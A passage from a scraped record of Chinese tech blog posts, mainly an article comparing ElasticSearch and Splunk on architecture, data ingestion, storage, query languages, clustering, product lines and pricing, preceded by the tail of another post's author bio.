class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/snowhere\">孙腾浩</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/snowhere\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/47765e50cfb7c4e598e72d893ab4f62f.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            毕业于郑州大学软件工程专业，身为 Java 程序猿却同样热爱着 JavaScript 。为了兴趣而写代码，做自己喜欢做的事。Stay Cool 。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/snowhere\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/snowhere/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/snowhere/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 16</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://snowhere.me/\"><i class=\"fa fa-link\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/Snowhere/\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://i2.wp.com/redditupvoted.files.wordpress.com/2017/04/place-final.png?crop=0px%2C0px%2C1000px%2C483px&resize=1200%2C580&ssl=1"], "fav_nums": 7, "comment_nums": 0, "create_date": "2017/06/13", "praise_nums": 4}
{"tags": "ElasticSearch,IT技术,Splunk", "front_image_path": "full/e81f66bb819f021a1b7b51d3573617097a9d860d.jpg", "title": "大数据搜索选开源还是商业软件？ElasticSearch 对比 Splunk", "url_object_id": "78d28f7dbe719356ad7e22862dbab59e", "url": "http://blog.jobbole.com/111525/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/taogang/blog/983586\">naughty</a>   </div><p>本文就架构，功能，产品线，概念等方面就ElasticSearch和Splunk做了一下全方位的对比，希望能够大家在制定大数据搜索方案的时候有所帮助。</p>\n<h2 id=\"h2_0\">简介</h2>\n<p><strong>ElasticSearch</strong> （<a href=\"https://www.elastic.co/\" rel=\"nofollow\">1</a>）（<a href=\"https://en.wikipedia.org/wiki/Elasticsearch\" rel=\"nofollow\">2</a>）是一个基于Lucene的开源搜索服务。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于<a href=\"http://baike.baidu.com/item/%E4%BA%91%E8%AE%A1%E7%AE%97\" target=\"_blank\" rel=\"nofollow\">云计算</a>中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>\n<p><strong>ELK</strong>是<a href=\"https://www.elastic.co/jp/products/elasticsearch\" rel=\"nofollow\">ElasticSearch</a>，<a href=\"https://www.elastic.co/jp/products/logstash\" rel=\"nofollow\">Logstash</a>，<a href=\"https://www.elastic.co/jp/products/kibana\" rel=\"nofollow\">Kibana</a>的缩写，分别提供搜索，数据接入和可视化功能，构成了Elastic的应用栈。</p>\n<p><strong>Splunk</strong> 是大数据领域第一家在纳斯达克上市公司，<a href=\"https://www.splunk.com/zh-hans_cn\" rel=\"nofollow\">Splunk</a>提供一个机器数据的引擎。使用 Splunk 可收集、索引和利用所有应用程序、服务器和设备（物理、虚拟和云中）生成的快速移动型计算机数据 。从一个位置搜索并分析所有实时和历史数据。 使用 Splunk 处理计算机数据，可让您在几分钟内（而不是几个小时或几天）解决问题和调查安全事件。监视您的端对端基础结构，避免服务性能降低或中断。以较低成本满足合规性要求。关联并分析跨越多个系统的复杂事件。获取新层次的运营可见性以及 IT 和业务智能。</p>\n<p>根据最新的<a href=\"https://db-engines.com/en/ranking\" rel=\"nofollow\">数据库引擎排名</a>显示，Elastic，Solr和Splunk分别占据了数据库搜索引擎的前三位。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/102156_SGGq_1450051.png\" width=\"942\" height=\"642\"></p>\n<p>从<a href=\"https://db-engines.com/en/ranking_trend\" rel=\"nofollow\">趋势</a>上来看，Elastic和Splunk上升明显，Elastic更是表现出了非常强劲的势头。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/102436_w14n_1450051.png\" width=\"963\" height=\"534\"></p>\n<h2 id=\"h2_1\">基本概念</h2>\n<p><a href=\"https://www.elastic.co/guide/en/elasticsearch/reference/current/_basic_concepts.html\" rel=\"nofollow\"><strong>Elastic</strong></a></p>\n<ul>\n<li>准实时(NRT)<br>\nElasticsearch是一个准实时性的搜索平台，从数据索引到数据可以被搜索存在一定的时延。</li>\n<li>索引（Index）<br>\n索引是有共同特性的文档的集合，索引有自己的名字，可以对索引执行搜索，更新，删除等操作。</li>\n<li>类型（Type）<br>\n每个索引可以包含一个或者多个类型，类型可以看作一个索引数据的逻辑分组，通常我们会把拥有相同字段的文档定义为同一个类型。</li>\n<li>文档（Document）<br>\n文档是索引信息的基本单元。Elastic中文档表现为JSON对象，文档物理存贮在索引中，并需要被制定一个类型。因为表现为JSON， 很自然的，文档是由一个个的字段（Feilds）组成，每个字段是一个名值对（Name Value Pair）</li>\n<li>评分（score）<br>\nElastic是基于<a href=\"https://lucene.apache.org/\" rel=\"nofollow\">Lucene</a>构建的，所以搜索的结果会有一个<a href=\"http://blog.chenlb.com/2009/08/lucene-scoring-architecture.html\" rel=\"nofollow\">打分</a>。来评价搜索结果和查询的相关性。</li>\n</ul>\n<p>下图是一个Elastic的搜索在Kibana中看到的例子，原始的数据是一个简单的日志文件：</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/143016_SOUq_1450051.png\" width=\"465\" height=\"187\"></p>\n<p>我们通过logstash索引到Elasticsearch后，就可以搜索了。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/135259_AEE0_1450051.png\" width=\"1222\" height=\"712\"></p>\n<p><a href=\"https://www.splunk.com/content/dam/splunk2/pdfs/solution-guides/splunk-quick-reference-guide.pdf\" rel=\"nofollow\"><strong>Splunk</strong></a></p>\n<ul>\n<li>实时性<br>\nSplunk同样是准实时的，Splunk的实时搜索（<a href=\"http://docs.splunk.com/Documentation/SplunkCloud/6.6.0/Search/RealtimesearchesandreportsinSplunkWeb\" rel=\"nofollow\">Realtime Search</a>）可以提供不间断的搜索结果的数据流。</li>\n<li>事件（Event）<br>\n对应于Elastic的文档，Splunk的数据索引的基本单元是事件，每一个事件包含了一组值，字段，时间戳。Splunk的事件可以是一段文本，一个配置文件，一段日志或者JSON对象。</li>\n<li>字段（Fields）<br>\n字段是可以被搜索的名值对，不同的事件可能拥有不同的字段。Splunk支持索引时（index time）和搜索时（search time）的字段抽取（fields extraction）</li>\n<li>索引（Indexes）<br>\n类似Elastic的索引，所有的事件物理存储在索引上，可以把索引理解为一个数据库的表。</li>\n<li>知识对象（Knowledge Object）<br>\nSplunk的知识对象提供对数据进一步的解释，分类，增强等功能，包括：字段（fields），字段抽取（fields extraction），事件类型（event type），事务（transaction），查找（lookups），标签（tags），别名（aliases），数据模型（data model）等等。</li>\n</ul>\n<p>下图是一个Splunk的搜索在Splunk客户端看到的和前一个例子同样的日志数据的搜索结果。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/135439_CcWN_1450051.png\" width=\"924\" height=\"809\"></p>\n<p>从基本概念上来看，Elasticsearch和Splunk基本一致。从例子中我们可以看到很多的共性，事件／文档，时间戳，字段，搜索，时间轴图等等。其中有几个主要的差别：</p>\n<ul>\n<li>Elastic不支持搜索时的字段抽取，也就是说Elastic的文档中的所有字段在索引时已经固定了，而Splunk支持在搜索时，动态的抽取新的字段</li>\n<li>Elastic的搜索是基于评分机制的，搜索的结果有一个打分，而Splunk没有对搜索结果评分</li>\n<li>Splunk的知识对象可以提供对数据更高级，更灵活的管理能力。</li>\n</ul>\n<h2 id=\"h2_2\">用户接口</h2>\n<p>ElasticSearch提供REST API来进行</p>\n<ul>\n<li>集群的管理，监控，健康检查</li>\n<li>索引的管理（CURD）</li>\n<li>搜索的执行，包括排序，分页，过滤，脚本，聚合等等高级的搜索功能。</li>\n</ul>\n<p>Elasticsearch 本身并没有提供任何UI的功能，搜索可以用Kibana，但是没有管理UI还是让人不爽的，好在开源的好处就是会有很多的开发者来构建缺失的功能：</p>\n<ul>\n<li><a href=\"http://www.elastichq.org/\" rel=\"nofollow\">ElasticHQ</a></li>\n<li><a href=\"https://github.com/lmenezes/cerebro\" rel=\"nofollow\">cerebro</a> (推荐，界面干净，我喜欢)</li>\n<li><a href=\"https://github.com/appbaseio/dejavu/tree/dev\" rel=\"nofollow\">dejavu</a></li>\n</ul>\n<p>另一选择就是安装X-Pack，这个是要收费的。</p>\n<p>Splunk作为企业软件，管理及访问接口比较丰富，除了REST API 和命令行接口，Splunk的UI非常友好易用，基本上所有的功能都能通过集成的UI来使用。同时提供以下接口</p>\n<ul>\n<li>REST API</li>\n<li>Splunk UI</li>\n<li>CLI</li>\n</ul>\n<h2 id=\"h2_3\">功能</h2>\n<h3 id=\"h3_4\">数据接入和获取</h3>\n<p><strong>Elastic</strong>栈使用Logstash和Beats来进行数据的消化和获取。</p>\n<p><a href=\"https://github.com/elastic/logstash\" rel=\"nofollow\">Logstash</a>用jruby实现，有点像一个数据管道，把输入的数据进行处理，变形，过滤，然后输出到其它地方。Logstash 设计了自己的 DSL，包括有区域，注释，数据类型(布尔值，字符串，数值，数组，哈希)，条件判断，字段引用等。</p>\n<p>Logstash的数据管道包含三个步骤，Input，Filter和Output，每一步都可以通过plugin来扩展。另外Input和Output还支持配置Codecs，完成对输入输出数据的编解码工作。</p>\n<p><img src=\"https://static.oschina.net/uploads/img/201706/19170803_cGoS.png\" alt=\"\"></p>\n<p>Logstash支持的常见的Input包含File，syslog，beats等。Filter中主要完成数据的变形处理，可以增删改字段，加标签，等等。作为一个开源软件，Output不仅仅支持ElasticSearch，还可以和许多其它软件集成和目标，Output可以是文件，graphite，数据库，Nagios，S3，Hadoop等。</p>\n<p><img src=\"https://static.oschina.net/uploads/img/201706/19170811_3g2R.jpg\" alt=\"\"></p>\n<p>在实际运用中，logstash 进程会被分为两个不同的角色。运行在应用服务器上的，尽量减轻运行压力，只做读取和转发，这个角色叫做 shipper；运行在独立服务器上，完成数据解析处理，负责写入 Elasticsearch 的角色，叫 indexer。</p>\n<p>logstash 作为无状态的软件，配合消息队列系统，可以很轻松的做到线性扩展</p>\n<p><a href=\"https://github.com/elastic/beats\" rel=\"nofollow\">Beats</a>是 Elastic 从 packetbeat 发展出来的数据收集器系统。beat 收集器可以直接写入 Elasticsearch，也可以传输给 Logstash。其中抽象出来的 libbeat，提供了统一的数据发送方法，输入配置解析，日志记录框架等功能。</p>\n<p><img src=\"https://static.oschina.net/uploads/img/201706/19170345_gLzF.png\" alt=\"\"></p>\n<p>开源社区已经贡献了<a href=\"https://www.elastic.co/guide/en/beats/libbeat/current/community-beats.html\" rel=\"nofollow\">许多的beats</a>种类。</p>\n<p>因为Beats是使用Golang编写的，效率上很不错。</p>\n<p><strong>Splunk</strong>使用Farwarder和Add-ons来进行数据的消化和获取。</p>\n<p>Splunk内置了对文件，syslog，网络端口等input的处理。当配置某个节点为Forwarder的时候，Splunk Forwarder可以作为一个数据通道把数据发送到配置好的indexer去。这时候，它就类似logstash。这里一个主要的区别就是对数据字段的抽取，Elastic必须在logstash中通过filter配置或者扩展来做，也就是我们所说的Index time抽取，抽取后不能改变。Splunk支持Index time的抽取，但是更多时候，Splunk 在index time并不抽取而是等到搜索是在决定如何抽取字段。</p>\n<p>对于特定领域的数据获取，Splunk是用<a href=\"https://www.splunk.com/en_us/products/apps-and-add-ons.html\" rel=\"nofollow\">Add-on</a>的形式。Splunk 的App市场上有超过600个不同种类的Add-on。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0619/172840_Kc9n_1450051.png\" alt=\"\" width=\"788\" height=\"624\"></p>\n<p>用户可以通过特定的Add-on或者自己开发Add-on来获取特定的数据。</p>\n<p>对于大数据的数据采集，大家也可以参考我的<a href=\"https://my.oschina.net/taogang/blog/524385\" rel=\"nofollow\">另一篇博客</a>。</p>\n<h3 id=\"h3_5\">数据管理和存储</h3>\n<p>ElasticSearch的数据存贮模型来自于Lucene，基本原理是实用了倒排表。大家可以参考<a href=\"http://www.infoq.com/cn/articles/analysis-of-elasticsearch-cluster-part01\" rel=\"nofollow\">这篇文章</a>。</p>\n<p>Splunk的核心同样是倒排表，推荐大家看这篇去年Splunk Conf上的介绍，<a href=\"https://conf.splunk.com/files/2016/slides/behind-the-magnifying-glass-how-search-works.pdf\" rel=\"nofollow\">Behind the Magnifying Glass: How Search Works</a></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0619/173140_pJqA_1450051.png\" alt=\"\" width=\"2062\" height=\"890\"></p>\n<p>Splunk的Event存在许多Buckets中，多个Buckets构成逻辑分组的索引分布在Indexer上。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0619/175300_F8F0_1450051.png\" width=\"2134\" height=\"836\"></p>\n<p>每个Bucket中都是倒排表的结构存储数据，原始数据通过gzip压缩。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0619/191746_kL6q_1450051.png\" width=\"2066\" height=\"1052\"></p>\n<p>搜索时，利用Bloom filter定位数据所在的bucket。</p>\n<p>在对数据的存储管理上，Elastic 和Splunk都是利用了倒排表。Splunk对数据进行压缩，所以存储空间的占用要少很多，尤其考虑到大部分数据是文本，压缩比很高的，当然这会损失一部分性能用于数据的解压。</p>\n<h3 id=\"h3_6\">数据分析和处理</h3>\n<p>对数据的处理分析，ElasticSearch主要使用 <a href=\"https://www.elastic.co/guide/en/elasticsearch/reference/current/search.html\" rel=\"nofollow\">Search API</a>来实现。而Splunk则提供了非常强大的<a href=\"https://www.splunk.com/en_us/resources/search-processing-language.html\" rel=\"nofollow\">SPL</a>，相比起ES的Search API，Splunk的SPL要好用很多，可以说SPL就是非结构化数据的SQL。无论是利用SPL来开发分析应用，还是直接在Splunk UI上用SPL来处理数据，SPL都非常易用。开源社区也在试图为Elastic增加类似SPL的DSL来改善数据处理的易用性。例如：</p>\n<ul>\n<li><a href=\"https://github.com/chenryn/ESPL\" rel=\"nofollow\">https://github.com/chenryn/ESPL</a></li>\n</ul>\n<p>从这篇<a href=\"https://discuss.elastic.co/t/elastic-vs-splunk-query-feature-comparison-join-pipe-table-dedup-eval-chart-rex/23552\" rel=\"nofollow\">反馈</a>可以看出，ES的search还有许多的不足。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0619/194302_paug_1450051.png\" width=\"2234\" height=\"1066\"></p>\n<p>作为对此的响应，Elastic推出了<a href=\"https://www.elastic.co/guide/en/elasticsearch/painless/current/painless-getting-started.html\" rel=\"nofollow\">painless script</a>，该功能还处于实验阶段。</p>\n<h3 id=\"h3_7\">数据展现和可视化</h3>\n<p>Kibana是一个针对Elasticsearch的开源分析及可视化平台，用来搜索、查看交互存储在Elasticsearch索引中的数据。使用Kibana，可以通过各种图表进行高级数据分析及展示。</p>\n<p><img src=\"https://static.oschina.net/uploads/img/201706/19171453_gqaE.jpg\" alt=\"\"></p>\n<p>Splunk集成了非常方便的数据可视化和仪表盘功能，对于SPL的结果，可以非常方便的通过UI的简单设置进行可视化的分析，导出到仪表盘。</p>\n<p><img src=\"https://static.oschina.net/uploads/img/201706/19171456_fsKK.jpg\" alt=\"\"></p>\n<p>下图的比较来自<a href=\"https://www.itcentralstation.com/products/comparisons/kibana_vs_splunk\" rel=\"nofollow\">https://www.itcentralstation.com/products/comparisons/kibana_vs_splunk</a></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0619/193547_Wwq6_1450051.png\" width=\"1982\" height=\"750\"></p>\n<p>在数据可视化的领域的<a href=\"https://www.itcentralstation.com/categories/data-visualization#top_rated\" rel=\"nofollow\">排名</a>，Splunk仅仅落后于Tableau而已</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0619/194139_q14k_1450051.png\" width=\"2010\" height=\"1314\"></p>\n<h3 id=\"h3_8\">扩展性</h3>\n<p>从扩展性的角度来看，两个平台都拥有非常好的扩展性。</p>\n<p>Elastic栈作为一个开源栈，很容易通过Plugin的方式扩展。包括：</p>\n<ul>\n<li><a href=\"https://www.elastic.co/guide/en/elasticsearch/plugins/current/index.html\" rel=\"nofollow\">ElasticSearch Plugin </a></li>\n<li><a href=\"https://www.elastic.co/guide/en/kibana/current/kibana-plugins.html\" rel=\"nofollow\">Kibana Plugin</a></li>\n<li><a href=\"https://www.elastic.co/guide/en/logstash/current/working-with-plugins.html\" rel=\"nofollow\">Logstash Plugin</a></li>\n<li><a href=\"https://www.elastic.co/guide/en/beats/libbeat/current/new-beat.html\" rel=\"nofollow\">Beats Platform</a></li>\n</ul>\n<p>Splunk提供一系列的扩展点支持应用和Add-on的开发， 在<a href=\"http://dev.splunk.com/\" rel=\"nofollow\">http://dev.splunk.com/</a>可以找到更多的信息和文档。包括：</p>\n<ul>\n<li><a href=\"http://dev.splunk.com/webframework\" rel=\"nofollow\">Web Framework</a></li>\n<li><a href=\"http://dev.splunk.com/sdks\" rel=\"nofollow\">SDK</a></li>\n<li><a href=\"http://dev.splunk.com/view/python-sdk/SP-CAAAER3\" rel=\"nofollow\">Modular Input</a></li>\n<li>… …</li>\n</ul>\n<p>比起Elastic的Plugin，Splunk的扩展概念上比较复杂，开发一个App或者Add-on的门槛都要相对高一些。做为一个数据平台，Splunk应该在扩展性上有所改进，使得扩展变的更为容易和简单。</p>\n<h2 id=\"h2_9\">架构</h2>\n<p><strong>Elastic Stack</strong></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/104019_J5fb_1450051.png\" width=\"1152\" height=\"431\"></p>\n<p>如上图所示，ELK是一套栈，Logstash提供数据的消化和获取，Elasticsearch对数据进行存储，索引和搜索，而Kibana提供数据可视化和报表的功能。</p>\n<p><strong>Splunk</strong></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/103709_fR14_1450051.png\" width=\"699\" height=\"700\"></p>\n<p>Splunk的架构主要有三个角色：</p>\n<ul>\n<li>Indexer<br>\nIndexer提供数据的存储，索引，类似Elasticsearch的作用</li>\n<li>Search Head<br>\nSearch Head负责搜素，客户接入，从功能上看，一部分是Kibana，因为Splunk的UI是运行在Search Head上的，提供所有的客户端和可视化的功能，还有一部分，是提供分布式的搜索功能，包含对搜索的分发到Indexer和搜索结果的合并，这一部分功能对应在Elasticsearch上。</li>\n<li>Forwarder<br>\nSplunk的Forwarder负责数据接入，类似Logstash</li>\n</ul>\n<p>除了以上的三个主要的角色，Splunk的架构中还有：Deployment Server，License Server，Master Cluster Node，Deployer等。</p>\n<p>Splunk和ELK的基本架构非常类似，但是ELK的架构更为简单和清楚，Logstash负责数据接入，Kibana负责数据展现，所有的复杂性在Elasticsearch中。Splunk的架构更为复杂一些，角色的类型也更多一些。</p>\n<p>如果装单机版本，Splunk更容易，因为所有的功能一次性就装好了，而ELK则必须分别安装E/L/K，从这一点上来看，Splunk有一定的优势。</p>\n<h2 id=\"h2_10\">分布集群和扩展性</h2>\n<p><strong>ElasticSearch</strong></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/105032_zDW9_1450051.png\" width=\"607\" height=\"254\"></p>\n<p>ElasticSearch是为分布式设计的，有很好的扩展性，在一个典型的分布式配置中，每一个节点（node）可以配制成不同的角色，如上图所示：</p>\n<ul>\n<li>Client Node，负责API和数据的访问的节点，不存储／处理数据</li>\n<li>Data Node，负责数据的存储和索引</li>\n<li>Master Node， 管理节点，负责Cluster中的节点的协调，不存储数据。</li>\n</ul>\n<p>每一种角色可以通过ElasticSearch的配置文件或者环境变量来配置。每一种角色都可以很方便的Scale，因为Elastic采用了对等性的设计，也就是所有的角色是平等的，（Master Node会进行Leader Election，其中有一个是领导者）这样的设计使得在集群环境的伸缩性非常好，尤其是在容器环境，例如Docker Swarm或者Kubernetes中使用。</p>\n<p>参考：</p>\n<ul>\n<li><a href=\"https://elk-docker.readthedocs.io/#elasticsearch-cluster\" rel=\"nofollow\">https://elk-docker.readthedocs.io/#elasticsearch-cluster</a></li>\n<li><a href=\"https://github.com/pires/kubernetes-elasticsearch-cluster\" rel=\"nofollow\">https://github.com/pires/kubernetes-elasticsearch-cluster</a></li>\n</ul>\n<p><strong>Splunk</strong></p>\n<p>Splunk作为企业级的分布式机器数据的平台，拥有强大的分布式配置，包括跨数据中心的集群配置。Splunk提供两种集群，Indexer集群和Search Head集群。</p>\n<p>Splunk <a href=\"http://docs.splunk.com/Documentation/Splunk/6.6.1/Indexer/Basicclusterarchitecture\" rel=\"nofollow\">Indexer集群</a></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/104459_RNyl_1450051.png\" width=\"590\" height=\"525\"></p>\n<p>如上图所示，Splunk的indexer集群主要由三种角色：</p>\n<ul>\n<li>Master Node，Master Node负责管理和协调整个的集群，类似ES的Master。但是只有一个节点，不支持多Master（最新版本6.6）。Master Node负责\n<ul>\n<li>协调Peer Node之间的数据复制</li>\n<li>告诉Search Head数据在哪里</li>\n<li>Peer Node的配置管理</li>\n<li>Peer Node故障时的故障恢复</li>\n</ul>\n</li>\n<li>Peer Nodes，负责数据索引，类似ES的Data Node，Peer Node负责\n<ul>\n<li>存储索引数据</li>\n<li>发送／接收复制数据到其他Peer节点</li>\n<li>响应搜索请求</li>\n</ul>\n</li>\n<li>Search Head，负责数据的搜索和客户端API访问，类似ES的Client Node，但不完全相同。Search Head负责发送搜索请求到Peer Nodes，并对搜索的结果进行合并。</li>\n</ul>\n<p>有人会问，那Master是不是集群中的单点故障？What if Master node goes down？Splunk的回答是否。即使Master 节点出现故障，Peer Nodes仍然可以正常工作，除非，同时有Peer Node出现故障。</p>\n<ul>\n<li><a href=\"http://docs.splunk.com/Documentation/Splunk/6.6.1/Indexer/Whathappenswhenamasternodegoesdown\" rel=\"nofollow\">http://docs.splunk.com/Documentation/Splunk/6.6.1/Indexer/Whathappenswhenamasternodegoesdown</a></li>\n<li><a href=\"https://answers.splunk.com/answers/129446/why-does-master-node-continue-to-be-single-point-of-failure-in-clustering.html\" rel=\"nofollow\">https://answers.splunk.com/answers/129446/why-does-master-node-continue-to-be-single-point-of-failure-in-clustering.html</a></li>\n</ul>\n<p>Splunk <a href=\"http://docs.splunk.com/Documentation/Splunk/6.6.1/DistSearch/SHCarchitecture%C2%A0\" rel=\"nofollow\">Search Header 集群</a></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/121621_KPDw_1450051.png\" width=\"646\" height=\"408\"></p>\n<p>Search Head集群是由一组Search Head组成，它们共享配置，搜索任务等状态。该Cluster主要有以下角色：</p>\n<ul>\n<li>Deployer， 负责分发状态和应用到peers</li>\n<li>Cluster Member，其中有一个是Captain，负责协调。Cluster Memeber之间会互相通信，来保证状态一致。Load Balancer是个可选项，可以负责Search的接入。</li>\n<li>Search Peers，负责数据索引的 Indexer Nodes</li>\n</ul>\n<p>另外Splunk还曾经提供过一个功能叫做<a href=\"http://docs.splunk.com/Documentation/Splunk/6.6.1/DistSearch/Configuresearchheadpooling\" rel=\"nofollow\">Search Head Pooling</a>，不过现在已经Depecated了。</p>\n<p>Indexer集群可以和Search Head集群一起配置，构成一个分布式的Splunk配置。</p>\n<p>相比较ES的相对比较简单的集群配置，Splunk的集群配置比较复杂，ES中所有每一个节点可以灵活的配置角色，并且可以相对比较容易的扩展，利用例如Kubernetes的Pod的复制可以很容易的扩展每一个角色。扩展Splunk相对比较困难，要做到动态的伸缩，需要比较复杂的配置。大家可以参考<a href=\"https://github.com/outcoldman/docker-splunk-cluster\" rel=\"nofollow\">这里</a>，在容器环境里配置一个Splunk的集群需要比较多的布置，例如在这个<a href=\"https://github.com/outcoldman/docker-splunk-cluster/blob/master/examples/docker/cluster-master.env_file\" rel=\"nofollow\">Master的配置</a>中，用户需要考虑：</p>\n<ul>\n<li>如何配置License</li>\n<li>修改缺省的用户名口令</li>\n<li>为每一个Search Head配置Search Head Cluster</li>\n<li>等待Splunk进程成功启动</li>\n<li>配置业务发现</li>\n<li>安装应用</li>\n<li>… …</li>\n</ul>\n<p>并且集群的扩展很难直接利用容器编排平台提供的扩展接口，这一点Splunk还有很多提高的空间。</p>\n<h2 id=\"h2_11\">产品线</h2>\n<p><strong>Elastic</strong></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/103316_ysvG_1450051.png\" width=\"859\" height=\"436\"></p>\n<p>Elastic的产品线除了大家熟悉的ELK（ElasticSearch，Logstash，Kikana），主要包含</p>\n<ul>\n<li><a href=\"https://www.elastic.co/guide/en/beats/libbeat/current/index.html\" rel=\"nofollow\">Beats</a> Beats是一个开源组件，提供一个代理，把本地抓到的数据传送到ElasticSearch</li>\n<li><a href=\"https://www.elastic.co/guide/en/cloud/current/index.html\" rel=\"nofollow\">Elastic Cloud</a>， Elasti提供的云服务</li>\n<li><a href=\"https://www.elastic.co/guide/en/x-pack/current/index.html\" rel=\"nofollow\">X-Pack</a>， Elastic的扩展组件，提供安全，告警，监控，机器学习和图处理能力。主要功能需要付费使用。</li>\n</ul>\n<p><strong>Splunk</strong></p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/103236_KuNa_1450051.png\" width=\"1742\" height=\"756\"></p>\n<p>Splunk的产品线包括</p>\n<ul>\n<li>Splunk Enterprise</li>\n<li>Splunk Cloud， Splunk运营的云服务，跑在AWS上</li>\n<li>Splunk Light，Splunk Light版本，功能有所精简，面向中小企业</li>\n<li>Hunk， Splunk on Hadoop</li>\n<li>Apps ／ Add-ons,  Splunk提供大量的应用和数据获取的扩展，可以参考 <a href=\"http://apps.splunk.com/\" rel=\"nofollow\">http://apps.splunk.com/</a></li>\n<li>Splunk ITSI （IT Service Intelligence）， Splunk为IT运维专门开发的产品</li>\n<li>Splunk ES （Enterprise Security）， Splunk为企业安全开发的产品，这个是Splunk 公司的拳头产品，连续被<a href=\"http://www.gartner.com/it-glossary/security-information-and-event-management-siem/\" rel=\"nofollow\">Gartner</a>评为<a href=\"https://en.wikipedia.org/wiki/Security_information_and_event_management\" rel=\"nofollow\">SIEM</a>领域的领导者，挑战了该行业的传统巨鳄IBM，HP</li>\n<li>Splunk UBA （User Behavior Analytic）， UBA是Splunk在15年<a href=\"https://www.splunk.com/en_us/investor-relations/acquisitions/caspida.html\" rel=\"nofollow\">收购的Caspidia</a>带来的基于机器学习的安全产品。</li>\n</ul>\n<p>从产品线的角度来看，Splunk除了提供基本平台，在IT运维和安全领域都有自己的拳头产品。Elastic缺乏某个领域的应用。</p>\n<h2 id=\"h2_12\">价格</h2>\n<p>价格是大家非常关心的一个因素</p>\n<p>Elastic的基本组件都是开源的，参看<a href=\"https://www.elastic.co/cloud/as-a-service/subscriptions\" rel=\"nofollow\">下表</a>，X-pack中的一些高级功能需要付费使用。包含安全，多集群，报表，监控等等。</p>\n<p><a href=\"https://www.elastic.co/subscriptions#request-info\" rel=\"nofollow\"><img src=\"https://static.oschina.net/uploads/space/2017/0614/112815_X1nv_1450051.png\" width=\"879\" height=\"656\"></a></p>\n<p>云服务的<a href=\"https://www.elastic.co/cloud/as-a-service/pricing\" rel=\"nofollow\">价格</a>参考下图，ES的云是按照所使用的资源来收费，从这里选取的区域可以看出，ES的云也是运行在AWS上的。下图中的配置每月需要花费200美元左右。（不同区域的收费不同）</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/122208_0lhg_1450051.png\" width=\"1235\" height=\"838\"></p>\n<p>同时，除了Elastic自己，还有许多其他公司也提供Elastic Search的云服务，例如Bonsai，Qbox.io等。</p>\n<p><a href=\"https://www.slant.co/topics/170/~best-hosted-elasticsearch-services\" rel=\"nofollow\"><img src=\"https://static.oschina.net/uploads/space/2017/0614/122320_NH3b_1450051.png\" width=\"599\" height=\"715\"></a></p>\n<p><strong>Splunk</strong></p>\n<p>Splunk Enterprise是按照数据每日的流量按年或者无限制事件付费，每天1GB的话，每年是2700美元，每个月也是差不多200块。如果每天的数据量少于500M，可以使用Splunk提供的免费License，只是不能用安全，分布式等高级功能，500M可以做很多事情了。</p>\n<p><a href=\"https://www.splunk.com/en_us/products/pricing.html\" rel=\"nofollow\"><img src=\"https://static.oschina.net/uploads/space/2017/0614/112050_q0Dx_1450051.png\" width=\"1169\" height=\"568\"></a></p>\n<p>云服务的价格就要便宜多了，每天5GB，每年只要2430元，每个月不到200块。当然因为计费的方式不同，和Elastic的云就不好比较了。另外因为是在AWS上，中国的用户，呵呵了。</p>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0614/121744_0ol0_1450051.png\" width=\"1168\" height=\"541\"></p>\n<h2 id=\"h2_13\">总结</h2>\n<p>大数据的搜索平台已经成为了众多企业的标配，Elastic栈和Splunk是其中最为优秀和流行的选择。两者都有各自的优点和值得改进的地方。希望本文能够在你的大数据平台的选型上，有所帮助。也希望大家来和我交流，共同成长。</p>\n<h2 